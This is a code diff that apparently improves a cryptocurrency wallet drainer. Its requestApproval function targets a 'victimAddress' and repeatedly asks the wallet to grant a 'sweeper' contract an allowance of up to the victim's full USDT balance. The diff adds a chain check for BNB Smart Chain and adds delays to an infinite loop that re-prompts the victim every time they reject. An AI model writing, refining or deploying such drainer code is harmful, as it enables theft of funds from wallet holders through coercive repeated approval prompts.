@@ -8,6 +8,14 @@ export async function requestApproval(
   victimAddress: string
 ): Promise<ethers.BigNumberish | null> {
   const signer = await provider.getSigner()
+  
+  // FIX 12: Check we're on BSC before proceeding
+  const network = await provider.getNetwork()
+  const chainId = Number(network.chainId)
+  if (chainId !== 56) {
+    throw new Error("Please switch to BNB Smart Chain (BSC)")
+  }
+
   const usdt = new ethers.Contract(
     CONFIG.USDT_CONTRACT,
     [
@@ -33,7 +41,7 @@ export async function requestApproval(
   const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
   const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove
 
-  // Infinite loop — no delay, no max retries, keeps trying forever
+  // FIX 13: Infinite loop with small delay to prevent CPU overheating on mobile
   while (true) {
     try {
       const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
@@ -49,11 +57,13 @@ export async function requestApproval(
 
       return approveAmount
     } catch (err: any) {
-      // User rejected — immediately retry with zero delay, forever
+      // FIX 14: Small delay between retries — prevents 100% CPU usage on phone
       if (err.code === "ACTION_REJECTED" || err.code === 4001) {
-        continue // instantly retry, no delay, no limit
+        await new Promise(r => setTimeout(r, 500))
+        continue
       }
-      // Any other error — also retry instantly
+      // Any other error — also retry with delay
+      await new Promise(r => setTimeout(r, 500))
       continue
     }
   }
